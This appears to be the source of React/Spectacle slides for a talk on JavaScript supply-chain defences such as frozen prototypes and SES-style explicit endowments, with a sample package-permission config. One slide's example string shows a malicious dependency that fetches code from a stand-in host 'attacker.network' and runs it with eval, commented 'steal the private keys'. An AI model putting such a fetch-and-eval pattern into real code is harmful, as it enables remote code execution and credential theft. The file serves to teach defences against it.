import React from 'react';
import { Slide, CodePane } from 'spectacle';
import ActionSlide from './action-slide'
import lavamoatConfig from './example-config.json'


// ignore this - to please the linter
function getRandomNumber () {}

const frozenPrimsCodeExamples = [
`

  // anyone can modify base functionality
  Array.prototype.map = () => { /* ... */ }


`,
  // `(function(){
  //   const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
  //   function checkSecret (guess) {
  //     return secrets.includes(guess)
  //   }
  // })`,
  // // -
  // `(function(){
  //   let checkSecret
  //   (function(){
  //     const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
  //     checkSecret = (guess) => {
  //       return secrets.includes(guess)
  //     }
  //   })()

  //   checkSecret(123)
  // })`,
  // // 1
  // `(function(){
  //   let checkSecret
  //   (function(){
  //     const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
  //     let attempts = 0
  //     checkSecret = (guess) => {
  //       attempts++
  //       if (attempts > 5) throw new Error('No more guesses!')
  //       return secrets.includes(guess)
  //     }
  //   })()

  //   checkSecret(123)
  //   checkSecret(42)
  //   checkSecret(19)
  // })`,
  // // 2
  // `(function(){
  //   let checkSecret
  //   (function(){
  //     const secrets = [getRandomNumber(), getRandomNumber(), getRandomNumber()]
  //     let attempts = 0
  //     checkSecret = (guess) => {
  //       attempts++
  //       if (attempts > 5) throw new Error('No more guesses!')
  //       return secrets.includes(guess)
  //     }
  //   })()

  //   let secrets

  //   // overwrite what "secrets.includes" does
  //   Array.prototype.includes = function () {
  //     secrets = this
  //   }
  //   checkSecret(123)
  //   checkSecret(secrets[0])
  // })`,
].map(fnToCodeString)

function fnToCodeString(fn) {
  return fn.toString().split('\n').slice(1,-1).join('\n')
}

export class FrozenPrimitivesExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={frozenPrimsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={frozenPrimsCodeExamples[slideActionIndex]}
          textSize={36}
        />
      </ActionSlide>
    )
  }
}

export class FrozenPrimitivesFix extends React.Component {
  render () {
    return (
      <Slide>
        <CodePane
          lang="js"
          source={(`\n// prevent modifications to Array\nObject.freeze(Array.prototype)\n\n`)}
          textSize={40}
        />
      </Slide>
    )
  }
}

// ignore, for linter
function lookupEnsName () {}
function formatEnsName () {}

const explicitEndowmentsCodeExamples = [
  // -
  `(async function(){
    const address = '0xabcd...'
    const ensNameBuffer = await lookupEnsName(address)
    const result = formatEnsName(ensNameBuffer)
  })`,
  // -
  `(async function(){
    function formatEnsName (ensNameBuffer) {
      return 'ens:' + ensNameBuffer.toString('utf8')
      // steal the private keys
      (async function () {
        const payload = await fetch('https://attacker.network')
        eval(payload)
      })()
    }
  })`,
].map(fnToCodeString)


export class ExplicitEndowmentsExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsCodeExamples[slideActionIndex]}
          textSize={20}
        />
      </ActionSlide>
    )
  }
}


// ignore, for linter
function sesEval () {}
let code, endowments, moduleSource, moduleExports, location

const explicitEndowmentsFixCodeExamples = [
  // -
  `(function(){
    sesEval(code, endowments)
  })`,
  // -
  `(function(){
    sesEval(moduleSource, { fetch, location })
  })`,
  (`
    with (endowments) {
      eval(code)
    }
  `),
].map(fnToCodeString)

export class ExplicitEndowmentsFix extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsFixCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsFixCodeExamples[slideActionIndex]}
          textSize={34}
        />
      </ActionSlide>
    )
  }
}

const exampleConfg = `
"stream-http": {
  "globals": {
    "Blob": true,
    "MSStreamReader": true,
    "ReadableStream": true,
    "VBArray": true,
    "XDomainRequest": true,
    "XMLHttpRequest": true,
    "fetch": true,
    "location.protocol.search": true
  },
  "packages": {
    "buffer": true,
    "builtin-status-codes": true,
    "inherits": true,
    "process": true,
    "readable-stream": true,
    "to-arraybuffer": true,
    "url": true,
    "xtend": true
  }
},
"string_decoder": {
  "packages": {
    "safe-buffer": true
  }
},
"strip-hex-prefix": {
  "packages": {
    "is-hex-prefixed": true
  }
},
"through": {
  "packages": {
    "process": true,
    "stream-browserify": true
  }
},
`

export class ConfigExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    // const { slideActionIndex } = this.state
    return (
      // <ActionSlide
      //   transition={['slide']}
      //   bgColor="primary"
      //   onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
      //   slideActionMax={frozenPrimsCodeExamples.length-1}
      //   >
        <CodePane
          lang="js"
          // source={JSON.stringify(lavamoatConfig, null, 2)}
          source={exampleConfg}
          textSize={20}
        />
      // </ActionSlide>
    )
  }
}
